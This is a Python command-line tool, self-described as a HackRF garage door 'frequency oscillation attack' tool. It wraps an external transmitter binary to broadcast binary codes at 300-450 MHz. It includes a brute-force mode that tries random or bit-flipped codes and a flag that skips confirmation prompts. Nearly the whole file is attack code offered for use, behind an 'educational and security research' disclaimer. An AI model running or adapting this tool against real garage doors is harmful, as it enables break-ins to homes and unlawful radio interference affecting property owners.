#!/usr/bin/env python3
"""
Running Frequency Oscillation Attack

This script provides a user-friendly interface to run frequency oscillation attacks
using the transmitter program. It includes improved error handling and real-time feedback.
For educational and security research purposes only.
"""

import os
import sys
import time
import argparse
import logging
import subprocess
import numpy as np
from typing import List, Dict, Optional, Tuple

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
                   datefmt='%Y-%m-%d %H:%M:%S')

def print_banner():
    """Print a banner for the tool."""
    banner = """
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║   HackRF Garage Door Frequency Oscillation Attack Tool     ║
║                                                            ║
║   For educational and security research purposes only      ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
"""
    print(banner)

def check_transmitter():
    """Check if the transmitter program exists and is executable."""
    if not os.path.exists("./transmitter"):
        logging.error("Transmitter program not found. Compiling...")
        try:
            subprocess.run(["./compile_transmitter.sh"], check=True)
        except subprocess.CalledProcessError:
            logging.error("Failed to compile transmitter. Please check error logs.")
            return False
        except FileNotFoundError:
            logging.error("Compilation script not found. Please compile manually.")
            return False
    
    if not os.access("./transmitter", os.X_OK):
        logging.error("Transmitter program is not executable.")
        try:
            subprocess.run(["chmod", "+x", "./transmitter"], check=True)
            logging.info("Made transmitter executable.")
        except subprocess.CalledProcessError:
            logging.error("Failed to make transmitter executable.")
            return False
    
    return True

def validate_frequency(freq: float) -> bool:
    """Validate that frequency is within an acceptable range."""
    # Most garage door remotes operate between 300-450 MHz
    if not (300 <= freq <= 450):
        logging.error(f"Frequency {freq} MHz is outside the valid range (300-450 MHz)")
        return False
    return True

def validate_code(code: str) -> bool:
    """Validate that code contains only 0s and 1s."""
    if not all(bit in '01' for bit in code):
        logging.error(f"Code '{code}' contains invalid characters. Only 0s and 1s are allowed.")
        return False
    return True

def format_binary(code: str) -> str:
    """Format binary code for better readability."""
    # Clean code first
    code = code.replace(' ', '')
    # Insert space every 8 bits
    return ' '.join(code[i:i+8] for i in range(0, len(code), 8))

def generate_test_codes(base_code: Optional[str] = None, num_codes: int = 5) -> List[str]:
    """Generate test codes for brute force attack."""
    codes = []
    
    if base_code and validate_code(base_code):
        # Start with the base code
        codes.append(base_code)
        code_len = len(base_code)
        
        # Generate variations of the base code
        for i in range(1, num_codes):
            # Flip a few random bits in the code
            code = list(base_code)
            num_bits_to_flip = min(3, code_len // 4)  # Flip up to 3 bits or 25% of code length
            positions = np.random.choice(code_len, num_bits_to_flip, replace=False)
            
            for pos in positions:
                code[pos] = '1' if code[pos] == '0' else '0'
            
            codes.append(''.join(code))
    else:
        # Generate random codes (32 bits each)
        for _ in range(num_codes):
            code = ''.join(np.random.choice(['0', '1']) for _ in range(32))
            codes.append(code)
    
    return codes

def run_transmitter(freq: float, code: str, bandwidth: Optional[float] = None, rate: Optional[float] = None) -> bool:
    """Run the transmitter program with the specified parameters."""
    cmd = ["./transmitter", "-f", str(freq), "-c", code]
    
    # Add oscillation parameters if provided
    if bandwidth is not None and rate is not None:
        cmd.extend(["-b", str(bandwidth), "-r", str(rate)])
    
    logging.info(f"Running: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Log output
        for line in result.stdout.splitlines():
            logging.info(f"Transmitter: {line}")
        
        # Log any errors
        if result.stderr:
            for line in result.stderr.splitlines():
                logging.error(f"Transmitter error: {line}")
        
        return result.returncode == 0
    except FileNotFoundError:
        logging.error("Transmitter program not found.")
        return False
    except subprocess.SubprocessError as e:
        logging.error(f"Error running transmitter: {e}")
        return False

def run_attack(options: argparse.Namespace) -> None:
    """Run the frequency oscillation attack with the specified options."""
    # Validate frequency
    if not validate_frequency(options.frequency):
        return
    
    # Prepare codes
    codes = []
    if options.code:
        if not validate_code(options.code):
            return
        codes.append(options.code)
    
    if options.brute_force:
        logging.info(f"Generating {options.num_codes} test codes for brute force attack")
        codes = generate_test_codes(options.code if options.code else None, options.num_codes)
    
    if not codes:
        logging.error("No valid codes to transmit.")
        return
    
    # Print summary
    print("\nAttack Configuration:")
    print(f"Frequency: {options.frequency} MHz")
    print(f"Oscillation Bandwidth: {options.bandwidth} MHz")
    print(f"Oscillation Rate: {options.rate} Hz")
    print(f"Number of codes to try: {len(codes)}")
    print(f"Codes: {[format_binary(code) for code in codes]}")
    
    # Confirm with user
    if not options.force:
        response = input("\nProceed with the attack? (y/n): ")
        if response.lower() not in ['y', 'yes']:
            logging.info("Attack cancelled by user.")
            return
    
    # Run the attack
    print("\nRunning frequency oscillation attack...")
    success = False
    
    for i, code in enumerate(codes, 1):
        print(f"\nCode {i}/{len(codes)}: {format_binary(code)}")
        if run_transmitter(options.frequency, code, options.bandwidth, options.rate):
            logging.info(f"Successfully transmitted code: {format_binary(code)}")
            success = True
            
            if options.brute_force and i < len(codes):
                # Ask whether to continue with more codes
                if not options.force:
                    response = input("\nContinue with more codes? (y/n): ")
                    if response.lower() not in ['y', 'yes']:
                        break
        else:
            logging.error(f"Failed to transmit code: {format_binary(code)}")
        
        # Pause between transmissions
        if i < len(codes):
            time.sleep(1)
    
    # Print summary
    if success:
        print("\nAttack completed successfully.")
    else:
        print("\nAttack failed. Check error logs for details.")

def main():
    """Main entry point for the script."""
    parser = argparse.ArgumentParser(
        description='HackRF Garage Door Frequency Oscillation Attack Tool',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument('-f', '--frequency', type=float, required=True,
                       help='Target frequency in MHz (e.g., 315.0)')
    parser.add_argument('-c', '--code', type=str,
                       help='Binary code to transmit (e.g., 101010)')
    parser.add_argument('-b', '--bandwidth', type=float, default=0.2,
                       help='Oscillation bandwidth in MHz')
    parser.add_argument('-r', '--rate', type=float, default=10.0,
                       help='Oscillation rate in Hz')
    parser.add_argument('--brute-force', action='store_true',
                       help='Use brute force mode with multiple codes')
    parser.add_argument('-n', '--num-codes', type=int, default=5,
                       help='Number of codes to try in brute force mode')
    parser.add_argument('--force', action='store_true',
                       help='Skip confirmation prompts')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    options = parser.parse_args()
    
    # Set log level based on verbosity
    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print_banner()
    
    # Check if we can use the transmitter
    if not check_transmitter():
        sys.exit(1)
    
    # Run the attack
    run_attack(options)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unhandled error: {e}")
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)